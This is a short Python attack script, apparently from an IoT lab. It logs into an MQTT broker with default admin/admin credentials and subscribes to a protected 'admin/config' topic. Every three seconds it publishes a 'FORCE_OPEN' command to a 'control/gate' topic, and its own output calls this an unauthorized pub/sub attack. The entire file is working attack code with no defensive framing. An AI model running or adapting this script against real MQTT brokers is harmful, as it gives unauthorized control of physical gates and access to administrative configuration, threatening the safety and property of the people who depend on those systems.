import paho.mqtt.client as mqtt
import time

BROKER = "10.0.0.165"  #Raspberry Pi IP
PORT = 1883
USERNAME = "admin"
PASSWORD = "admin"
CLIENT_ID = "unauth_client_01"

SUBSCRIBE_TOPIC = "admin/config"
PUBLISH_TOPIC = "control/gate"
PUBLISH_PAYLOAD = "FORCE_OPEN"

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Connected to broker as unauthorized client.")
        client.subscribe(SUBSCRIBE_TOPIC)
        print(f"[!] Subscribed to protected topic: {SUBSCRIBE_TOPIC}")
    else:
        print(f"[-] Connection failed with code {rc}")

def on_message(client, userdata, msg):
    print(f"[📥] Received message from {msg.topic}: {msg.payload.decode()}")

client = mqtt.Client(client_id=CLIENT_ID)
client.username_pw_set(USERNAME, PASSWORD)
client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER, PORT, 60)
client.loop_start()

try:
    while True:
        client.publish(PUBLISH_TOPIC, PUBLISH_PAYLOAD)
        print(f"[📤] Published to protected topic: {PUBLISH_TOPIC} → {PUBLISH_PAYLOAD}")
        time.sleep(3)
except KeyboardInterrupt:
    client.loop_stop()
    client.disconnect()
    print("[-] Unauthorized PUB/SUB attack stopped.")
